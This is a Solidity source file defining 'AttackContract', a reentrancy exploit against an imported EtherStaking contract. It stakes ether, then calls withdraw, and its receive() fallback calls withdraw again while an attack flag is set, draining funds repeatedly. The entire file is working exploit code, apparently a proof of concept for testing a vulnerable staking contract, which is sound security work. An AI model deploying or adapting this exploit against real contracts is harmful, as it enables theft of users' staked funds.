// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./EtherStaking.sol";

contract AttackContract {
    EtherStaking public etherStaking;
    bool public attackMode = false;

    constructor(address _etherStakingAddress) {
        require(_etherStakingAddress != address(0), "Invalid EtherStaking address");
        etherStaking = EtherStaking(payable(_etherStakingAddress));
    }

    function attack() external payable {
        require(address(etherStaking) != address(0), "EtherStaking address is zero");
        etherStaking.stakeEther{value: msg.value}();
        attackMode = true;
        etherStaking.withdraw();
    }

    receive() external payable {
        if (attackMode) {
            etherStaking.withdraw();
        }
    }
}